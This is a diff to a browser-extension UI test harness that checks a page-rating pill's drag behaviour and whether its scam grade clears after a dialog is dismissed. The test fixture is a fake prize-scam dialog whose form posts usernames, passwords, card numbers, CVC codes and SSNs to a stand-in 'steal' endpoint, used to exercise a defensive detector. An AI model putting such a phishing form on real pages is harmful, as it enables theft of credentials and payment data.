@@ -37,11 +37,43 @@ function buildHarness() {
     FILES.forEach((file) => {
         fs.copyFileSync(path.join(__dirname, '..', 'extension', 'js', file), path.join(dir, file));
     });
+    /* A dialog that rates badly, raised and dismissed the way a single page
+       app does it: the address changes first and the markup lingers while it
+       animates away. That gap is what used to leave the pill showing the
+       dialog's verdict over a page the dialog was no longer on. */
+    const DIALOG = `<h2>CONGRATULATIONS! You have been selected as our WINNER!</h2>
+    <p>ACT NOW! This exclusive offer expires in 5 minutes. Claim your FREE gift card prize before
+    it is gone forever. Limited time only! You must verify your account immediately or it will be
+    permanently suspended. Risk free, 100% guaranteed. Urgent action required.</p>
+    <form action="https://collector.example.net/steal" method="post">
+      <input name="username"><input type="password" name="password">
+      <input name="cardnumber" autocomplete="cc-number"><input name="cvc" autocomplete="cc-csc">
+      <input name="ssn"><button>Claim your prize now</button></form>`;
+
     fs.writeFileSync(path.join(dir, 'harness.html'),
         `<!doctype html><html><head><meta charset="utf-8"><title>UI harness</title>
+<link rel="icon" href="data:image/gif;base64,R0lGODlhAQABAAAAACw="><meta name="description" content="A harness.">
 <style>body{margin:0;font:16px/1.6 system-ui;background:#0e1116;color:#dfe6f2}.pad{padding:40px}</style>
 </head><body><div class="pad"><h1>UI harness</h1><p>A plain page for driving the injected interface.</p>
-<p><a href="/contact">Contact</a> · <a href="/privacy">Privacy</a></p></div>
+<p><a href="/contact">Contact</a> · <a href="/privacy">Privacy</a> · <a href="/about">About</a></p></div>
+<div id="dialog-slot"></div>
+<script>
+window.raiseDialog = function () {
+    const d = document.createElement('div');
+    d.id = 'dlg';
+    d.setAttribute('role', 'dialog');
+    d.innerHTML = ${JSON.stringify(DIALOG)};
+    document.getElementById('dialog-slot').appendChild(d);
+    location.hash = '#upgrade';
+};
+window.dismissDialog = function (linger) {
+    location.hash = '';
+    setTimeout(function () {
+        const d = document.getElementById('dlg');
+        if (d) { d.remove(); }
+    }, linger);
+};
+</script>
 ${FILES.map((f) => `<script src="./${f}"></script>`).join('\n')}
 </body></html>`);
     return path.join(dir, 'harness.html');
@@ -63,6 +95,7 @@ const READ_BOXES = () => {
         toggle: box(root.querySelector('.ssc-dock__toggle')),
         button: box(root.querySelector('.ssc-button')),
         panel: panel && !panel.hidden ? box(panel) : null,
+        rating: root.querySelector('.ssc-button__badge').textContent,
         side: root.querySelector('.ssc-dock').classList.contains('ssc-dock--left') ? 'left' : 'right',
         /* What the dock would measure with the whole address showing - the
            width the opening side has to have room for. */
@@ -130,7 +163,8 @@ const READ_BOXES = () => {
             await page.mouse.move(x, y);
             await page.waitForTimeout(20);
             const b = await page.evaluate(READ_BOXES);
-            trail.push({pointer: x, left: b.dock.left, right: b.dock.right, side: b.side});
+            trail.push({pointer: x, left: b.dock.left, right: b.dock.right,
+                        side: b.side, window: b.width});
         }
         await page.mouse.up();
         await page.waitForTimeout(700);
@@ -158,6 +192,34 @@ const READ_BOXES = () => {
         });
         console.log(`  ${label.padEnd(40)} ${trail.length} steps, ` +
                     `sides: ${[...new Set(trail.map((f) => f.side))].join(' then ')}`);
+    };
+
+    /*
+     * An opened pill has room on both sides almost everywhere, so what decides
+     * its side is how near an edge it has been parked. That has to happen as
+     * it arrives, not once it is flush against the window: a turn with nowhere
+     * left to go is a turn that came too late to mean anything.
+     *
+     * EDGE mirrors the constant of the same name in content.js.
+     */
+    const EDGE = 10;
+
+    const checkTurnsEarly = (label, trail, edge) => {
+        const turn = trail.findIndex((f, i) => i > 0 && f.side !== trail[i - 1].side);
+        if (turn < 1) { problems.push(`${label}: the dock never turned round`); return; }
+
+        const f = trail[turn];
+        const span = f.window - (f.right - f.left) - 2 * EDGE;
+        const along = (f.left - EDGE) / span;               // 0 at the far left, 1 at the far right
+        const out = edge === 'left' ? along : 1 - along;    // how far out from that edge it turned
+
+        if (out <= 0) {
+            problems.push(`${label}: it only turned once flush against the ${edge} edge`);
+        } else if (out > 0.12) {
+            problems.push(`${label}: it turned ${Math.round(out * 100)}% out from the ${edge} ` +
+                          `edge, which is too early to read as parking against it`);
+        }
+        console.log(`  ${label.padEnd(40)} turned ${(out * 100).toFixed(1)}% out from the ${edge} edge`);
     };
 
     /*
@@ -197,9 +259,14 @@ const READ_BOXES = () => {
     /* The two things the drag has to get right: the pill stays under the
        cursor whichever way the dock turns, and the turn happens while there is
        still room to open rather than once the edge is reached. */
-    checkNoJump('dragging the pill to the left edge', await dragSweep(20, 34));
+    let trail = await dragSweep(20, 34);
+    checkNoJump('dragging the pill to the left edge', trail);
+    checkTurnsEarly('the pill turning at the left edge', trail, 'left');
     await check('pill against the left edge');
-    checkNoJump('dragging the pill to the right edge', await dragSweep(1260, 40));
+
+    trail = await dragSweep(1260, 40);
+    checkNoJump('dragging the pill to the right edge', trail);
+    checkTurnsEarly('the pill turning at the right edge', trail, 'right');
     await check('pill against the right edge');
 
     await click('.ssc-dock__toggle');                 // collapse
@@ -222,6 +289,34 @@ const READ_BOXES = () => {
         await click('.ssc-button');
         await check('report open, ' + label);
         await click('.ssc-button');
+    }
+
+    /*
+     * A verdict has to keep up with the page it is about. The dialog rates
+     * badly; dismissing it takes the address back first and leaves the markup
+     * behind for a moment, and a scan that lands in that gap reads a page that
+     * is on its way out. Nothing looked again afterwards, so the warning
+     * stayed up over a page that no longer carried it.
+     */
+    await page.setViewportSize({width: 1280, height: 800});
+    await page.evaluate(() => window.raiseDialog());
+    await page.waitForTimeout(3400);
+    const raised = (await page.evaluate(READ_BOXES)).rating;
+    if (raised !== 'F') {
+        problems.push(`the dialog was rated ${raised || '(nothing)'}, so the next check proves nothing`);
+    }
+    console.log(`  ${'dialog raised'.padEnd(40)} rated ${raised}`);
+
+    for (const linger of [900, 3200]) {
+        await page.evaluate((ms) => window.dismissDialog(ms), linger);
+        await page.waitForTimeout(linger + 5000);
+        const after = (await page.evaluate(READ_BOXES)).rating;
+        if (after !== 'A') {
+            problems.push(`the dialog's verdict (${after}) stayed on the pill ` +
+                          `after it was dismissed with a ${linger}ms exit`);
+        }
+        console.log(`  ${`dialog dismissed, ${linger}ms exit`.padEnd(40)} rated ${after}`);
+        if (linger !== 3200) { await page.evaluate(() => window.raiseDialog()); await page.waitForTimeout(3400); }
     }
 
     for (const [w, h] of [[420, 720], [1100, 420], [360, 640]]) {
